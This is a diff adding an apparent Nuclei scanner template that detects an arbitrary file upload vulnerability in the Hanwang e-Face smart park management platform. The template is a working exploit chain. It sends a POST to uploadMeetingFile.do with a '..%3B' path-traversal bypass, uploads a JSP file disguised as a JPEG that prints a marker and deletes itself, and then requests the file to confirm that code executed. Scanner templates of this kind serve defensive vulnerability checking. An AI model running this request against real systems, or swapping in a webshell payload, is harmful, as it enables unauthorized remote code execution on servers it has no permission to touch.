@@ -1,0 +1,58 @@
+id: poc-hw-e-face-pass-uploadmeetingfile-anyfile-upload
+info:
+  name: 汉王e脸通智慧园区管理平台 uploadMeetingFile.do 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  random_name: "{{rand_base(7)}}"
+  encoded_name: "{{base64(random_name)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/manage/intercom/..%3B/..%3B/manage/meetingPersonal/uploadMeetingFile.do"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{random_name}}.jsp"
+      Content-Type: image/jpeg
+
+      <%
+      out.print("{{encoded_name}}");
+      new java.io.File(application.getRealPath(request.getServletPath())).delete();
+      %>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":true"
+    extractors:
+      - type: regex
+        name: uploaded_file
+        regex:
+          - "\\\"path\\\":\\\"(?P<file>.*?).jsp"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/manage/resource/{{uploaded_file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{encoded_name}}"
